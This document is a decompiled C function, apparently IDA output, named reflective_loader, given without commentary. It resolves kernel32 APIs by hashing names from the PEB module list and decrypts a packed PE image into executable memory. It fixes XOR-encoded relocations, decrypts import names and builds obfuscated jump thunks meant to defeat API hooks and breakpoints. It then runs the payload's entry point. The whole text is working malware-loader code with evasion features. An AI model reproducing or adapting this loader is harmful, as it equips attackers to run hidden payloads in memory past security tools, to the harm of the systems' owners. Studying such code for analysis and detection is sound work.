__int64 __fastcall reflective_loader(sb_packed_pe_hdr **payload_ptr) {
  struct _LIST_ENTRY *ldr_entry;
  struct _LIST_ENTRY *mod_name;
  unsigned int mod_hash;
  int char_lower;
  struct _LIST_ENTRY *kernel32_base;
  struct _LIST_ENTRY *pVirtualAlloc;
  _DWORD *export_dir;
  unsigned int *name_ptrs;
  int export_idx;
  unsigned __int32 export_hash;
  _BYTE *export_name;
  int name_char;
  __int64 ordinal_idx;
  struct _LIST_ENTRY *resolved_LoadLib;
  struct _LIST_ENTRY *resolved_GetProc;
  void(__fastcall * resolved_Sleep)(_QWORD);
  sb_packed_pe_hdr *packed_pe;
  unsigned int *alloc_result;
  int reloc_idx;
  __int64 mapped_base;
  unsigned __int64 prng_state;
  __int64 fill_count;
  unsigned int *fill_ptr;
  int *section_entry;
  _BYTE *section_dst;
  int section_byte_idx;
  char *section_src_delta;
  unsigned int reloc_key;
  unsigned int *reloc_block;
  unsigned __int16 *reloc_entry;
  int reloc_raw;
  unsigned __int16 reloc_xored;
  int reloc_type;
  signed int i;
  __int64 v36;
  _BYTE *thunk_ptr;
  unsigned int *import_desc;
  _BYTE *enc_name;
  _BYTE *dec_buf;
  __int64 v41;
  unsigned int dec_key;
  __int64 v43;
  unsigned int xor_key;
  __int64 *iat_entry;
  _BYTE *resolved_api;
  _BYTE *dec_cursor;
  _BYTE *enc_cursor;
  unsigned int dec_key2;
  __int64 enc_delta;
  __int64 api_addr;
  signed int iat_size;
  signed int v53;
  __int64 v54;
  struct _LIST_ENTRY *pLoadLibraryA;
  void(__fastcall * pSleep)(_QWORD);
  __int64 hModule;
  __int64 *iat_table;
  sb_packed_pe_hdr *packed_pe_saved;
  __int64 iat_idx;
  __int64 thunk_table;
  _BYTE name_buf[1088];
  __int64 ordinal_offset;
  signed int section_idx;
  unsigned int decrypt_key;
  struct _LIST_ENTRY *resolved_VAlloc;
  __int64 iat_offset;
  struct _LIST_ENTRY *pGetProcAddress;

  for (ldr_entry = NtCurrentPeb()->Ldr->InLoadOrderModuleList.Flink;;
       ldr_entry = ldr_entry->Flink) {
    if (!ldr_entry[3].Flink)
      return 1;
    mod_name = ldr_entry[6].Flink;
    mod_hash = 0;
    if (LOWORD(mod_name->Flink)) {
      do {
        char_lower = LOBYTE(mod_name->Flink) | 0x20;
        mod_name = (struct _LIST_ENTRY *)((char *)mod_name + 2);
        mod_hash = (char_lower + __ROR4__(mod_hash, 8)) ^ SB_XOR_CONSTANT;
      } while (LOWORD(mod_name->Flink));
      if (mod_hash == 0xFD5B1261)
        break;
    }
  }
  kernel32_base = ldr_entry[3].Flink;
  if (!kernel32_base)
    return 1;
  pLoadLibraryA = nullptr;
  pGetProcAddress = nullptr;
  pVirtualAlloc = nullptr;
  resolved_VAlloc = nullptr;
  export_dir = (_DWORD *)((char *)kernel32_base +
                          *(unsigned int *)((char *)&kernel32_base[8].Blink +
                                            SHIDWORD(kernel32_base[3].Blink)));
  pSleep = nullptr;
  name_ptrs =
      (unsigned int *)((char *)kernel32_base + (unsigned int)export_dir[8]);
  export_idx = 0;
  if ((int)export_dir[6] > 0) {

    ordinal_offset = 0;
    do {
      export_hash = 0;
      for (export_name = (char *)kernel32_base + *name_ptrs; *export_name;
           export_hash =
               (name_char + __ROR4__(export_hash, 8)) ^ SB_XOR_CONSTANT) {
        name_char = (char)*export_name++;
      }
      pVirtualAlloc = resolved_VAlloc;
      ordinal_idx =
          *(unsigned __int16 *)((char *)&kernel32_base->Flink + ordinal_offset +
                                (unsigned int)export_dir[9]);
      resolved_LoadLib = pLoadLibraryA;
      if (export_hash == HASH_LoadLibraryA)
        resolved_LoadLib =
            (struct _LIST_ENTRY
                 *)((char *)kernel32_base +
                    *(unsigned int *)((char *)&kernel32_base->Flink +
                                      4 * ordinal_idx +
                                      (unsigned int)export_dir[7]));
      pLoadLibraryA = resolved_LoadLib;
      resolved_GetProc = pGetProcAddress;
      if (export_hash == HASH_GetProcAddress)
        resolved_GetProc =
            (struct _LIST_ENTRY
                 *)((char *)kernel32_base +
                    *(unsigned int *)((char *)&kernel32_base->Flink +
                                      4 * ordinal_idx +
                                      (unsigned int)export_dir[7]));
      pGetProcAddress = resolved_GetProc;
      resolved_Sleep = pSleep;
      if (export_hash == HASH_VirtualAlloc)
        pVirtualAlloc =
            (struct _LIST_ENTRY
                 *)((char *)kernel32_base +
                    *(unsigned int *)((char *)&kernel32_base->Flink +
                                      4 * ordinal_idx +
                                      (unsigned int)export_dir[7]));
      resolved_VAlloc = pVirtualAlloc;
      if (export_hash == HASH_Sleep)
        resolved_Sleep = (void(__fastcall *)(_QWORD))(
            (char *)kernel32_base +
            *(unsigned int *)((char *)&kernel32_base->Flink + 4 * ordinal_idx +
                              (unsigned int)export_dir[7]));
      pSleep = resolved_Sleep;
      if (pLoadLibraryA && pGetProcAddress && pVirtualAlloc && resolved_Sleep)
        break;
      ordinal_offset += 2;
      ++export_idx;
      ++name_ptrs;
    } while (export_idx < export_dir[6]);
  }
  packed_pe = *payload_ptr;
  packed_pe_saved = packed_pe;

  if ((packed_pe->magic0 ^ packed_pe->magic1) != SB_XOR_CONSTANT)
    return 5;
  if (packed_pe->pe_magic != 523)
    return 6;

  alloc_result = (unsigned int *)((
      __int64(__fastcall *)(_QWORD, _QWORD, __int64, __int64))pVirtualAlloc)(
      0, packed_pe->size_of_image + 0x4000, 4096, 64);
  reloc_idx = 0;
  mapped_base = (__int64)alloc_result;
  if (!alloc_result)
    return 7;
  prng_state = (unsigned __int64)alloc_result;
  fill_count = 0;
  if ((int)packed_pe->prng_fill_size > 0) {
    fill_ptr = alloc_result;
    do {
      *(_BYTE *)fill_ptr = prng_state;
      fill_count = (unsigned int)(fill_count + 1);
      fill_ptr = (unsigned int *)((char *)fill_ptr + 1);
      prng_state = (prng_state >> 16) + 4017138666u + (prng_state << 16);
    } while ((int)fill_count < (signed int)packed_pe->prng_fill_size);
  }
  *alloc_result = packed_pe->magic0;
  alloc_result[1] = packed_pe->magic1;
  alloc_result[10] = packed_pe->entry_point_rva;
  alloc_result[13] = packed_pe->checksum;
  section_idx = 0;
  if ((int)packed_pe->num_sections > 0) {

    section_entry = (int *)&packed_pe[1];
    do {
      section_dst = (char *)alloc_result + (unsigned int)*(section_entry - 2);
      section_byte_idx = 0;
      if (*section_entry > 0) {
        section_src_delta =
            (char *)((char *)packed_pe + (unsigned int)*(section_entry - 1) -
                     section_dst);
        do {
          if (section_dst[(_QWORD)section_src_delta]) {
            if (section_dst[(_QWORD)section_src_delta] == 1)
              *section_dst = 1;
            else
              *section_dst = section_dst[(_QWORD)section_src_delta];
          } else {
            *section_dst = 0;
          }
          ++section_byte_idx;
          ++section_dst;
        } while (section_byte_idx < *section_entry);
      }
      section_entry += 3;
      ++section_idx;
    } while (section_idx < (signed int)packed_pe->num_sections);
    reloc_idx = 0;
  }
  reloc_key = packed_pe->magic0;
  decrypt_key = packed_pe->magic0;
  if (packed_pe->import_dir_rva && packed_pe->import_dir_size) {

    reloc_block =
        (unsigned int *)((char *)alloc_result + packed_pe->import_dir_rva);
    while (reloc_block[1]) {
      reloc_entry = (unsigned __int16 *)(reloc_block + 2);
      if ((int)(((unsigned __int64)reloc_block[1] - 8) >> 1) > 0) {
        do {
          reloc_raw = *reloc_entry;
          reloc_xored = reloc_key ^ reloc_raw;
          reloc_key = (reloc_key << 16) | (reloc_raw + HIWORD(reloc_key));
          reloc_type = reloc_xored >> 12;
          decrypt_key = reloc_key;
          if (reloc_type) {
            if (reloc_type == 3) {
              *(_DWORD *)(*reloc_block + mapped_base + (reloc_xored & 0xFFF)) +=
                  mapped_base - LODWORD(packed_pe->image_base);
            } else {
              if (reloc_type != 10)
                return 9;
              *(_QWORD *)(*reloc_block + mapped_base + (reloc_xored & 0xFFF)) +=
                  mapped_base - packed_pe->image_base;
            }
          }
          ++reloc_idx;
          ++reloc_entry;
        } while (reloc_idx <
                 (int)(((unsigned __int64)reloc_block[1] - 8) >> 1));
      }
      reloc_block = (unsigned int *)((char *)reloc_block + reloc_block[1]);
      reloc_idx = 0;
    }
  }

  if (packed_pe->import_dir_rva) {
    if (packed_pe->import_dir_size) {
      for (i = 0; i < (signed int)packed_pe->import_dir_size;
           *(_BYTE *)(v36 + mapped_base) = 0) {
        v36 = i + packed_pe->import_dir_rva;
        ++i;
      }
    }
  }
  thunk_ptr = (_BYTE *)(mapped_base + packed_pe->size_of_image);
  if (packed_pe->import_desc_rva && packed_pe->iat_size) {

    for (import_desc =
             (unsigned int *)(mapped_base + packed_pe->import_desc_rva);
         ; import_desc += 5) {
      if (!*import_desc)
        goto LABEL_99;
      thunk_table = mapped_base + import_desc[4];
      iat_table = (__int64 *)(mapped_base + *import_desc);
      enc_name = (_BYTE *)(mapped_base + import_desc[3]);
      dec_buf = name_buf;
      v41 = decrypt_key;
      name_buf[0] = decrypt_key ^ *enc_name;
      decrypt_key =
          (decrypt_key << 24) | ((char)*enc_name + (decrypt_key >> 8));
      if (name_buf[0]) {
        dec_key = decrypt_key;
        v43 = enc_name - name_buf;
        do {
          ++dec_buf;
          *dec_buf = dec_buf[v43] ^ dec_key;
          dec_key = (dec_key << 24) | ((char)dec_buf[v43] + (dec_key >> 8));
        } while (*dec_buf);
        decrypt_key = dec_key;
        packed_pe = packed_pe_saved;
      }
      hModule =
          ((__int64(__fastcall *)(_BYTE *, __int64, __int64))pLoadLibraryA)(
              name_buf, v41, fill_count);
      if (!hModule)
        break;
      iat_idx = 0;
      if (*iat_table) {
        iat_offset = 0;
        xor_key = decrypt_key;
        iat_entry = iat_table;
        while (1) {
          if (*iat_entry >= 0) {
            dec_cursor = name_buf;
            enc_cursor = (_BYTE *)(*iat_entry + mapped_base + 2);
            name_buf[0] = decrypt_key ^ *enc_cursor;
            decrypt_key =
                (decrypt_key << 24) | ((char)*enc_cursor + (decrypt_key >> 8));
            if (name_buf[0]) {
              dec_key2 = decrypt_key;
              enc_delta = enc_cursor - name_buf;
              do {
                ++dec_cursor;
                *dec_cursor = dec_cursor[enc_delta] ^ dec_key2;
                dec_key2 = (dec_key2 << 24) |
                           ((char)dec_cursor[enc_delta] + (dec_key2 >> 8));
              } while (*dec_cursor);
              decrypt_key = dec_key2;
              packed_pe = packed_pe_saved;
            }
            resolved_api = (_BYTE *)((__int64(__fastcall *)(
                __int64, _BYTE *))pGetProcAddress)(hModule, name_buf);
            xor_key = decrypt_key;
          } else {
            resolved_api = (_BYTE *)((
                __int64(__fastcall *)(__int64, _QWORD))pGetProcAddress)(
                hModule, *(unsigned __int16 *)iat_entry);
          }
          api_addr = (__int64)resolved_api;
          if (!resolved_api)
            return 11;
          if (*resolved_api == 0xCC)
            api_addr = (__int64)&resolved_api[xor_key];
          if (xor_key == 5 * (xor_key / 5)) {
            *thunk_ptr = -24;
            goto LABEL_94;
          }
          if (xor_key % 5 == 1) {
            *thunk_ptr = -23;
            goto LABEL_94;
          }
          if (xor_key % 5 == 2) {
            *thunk_ptr = -1;
            goto LABEL_94;
          }
          if (xor_key % 5 == 3)
            break;
          if (xor_key % 5 == 4) {
            *thunk_ptr = 117;
          LABEL_94:
            ++thunk_ptr;
          }
          *(_QWORD *)(thunk_table + iat_offset) = thunk_ptr;
          *(_WORD *)thunk_ptr = 0xB848;
          thunk_ptr += 16;
          *(_QWORD *)(thunk_ptr - 14) = -api_addr;
          *((_WORD *)thunk_ptr - 3) = 0xF748;
          *((_WORD *)thunk_ptr - 2) = 0x48D8;
          *((_WORD *)thunk_ptr - 1) = 0xE0FF;
          iat_entry = &iat_table[++iat_idx];
          iat_offset = 8 * iat_idx;
          if (!*iat_entry)
            goto LABEL_96;
        }
        *thunk_ptr = 72;
        goto LABEL_94;
      }
    LABEL_96:;
    }
    return 10;
  } else {

  LABEL_99:
    if (packed_pe->import_desc_rva) {
      iat_size = packed_pe->iat_size;
      if (iat_size) {
        v53 = 0;
        if (iat_size > 0) {
          do {
            v54 = v53 + packed_pe->import_desc_rva;
            ++v53;
            *(_BYTE *)(v54 + mapped_base) = 0;
          } while (v53 < (signed int)packed_pe->iat_size);
        }
      }
    }
    if (((unsigned int(__fastcall *)(__int64, __int64, sb_packed_pe_hdr **))(
            mapped_base + packed_pe->entry_point_rva))(mapped_base, 1,
                                                       payload_ptr)) {
      if (*((_DWORD *)payload_ptr + 3) == 8)
        pSleep(0xFFFFFFFFLL);
      return mapped_base;
    } else {
      return 12;
    }
  }
}
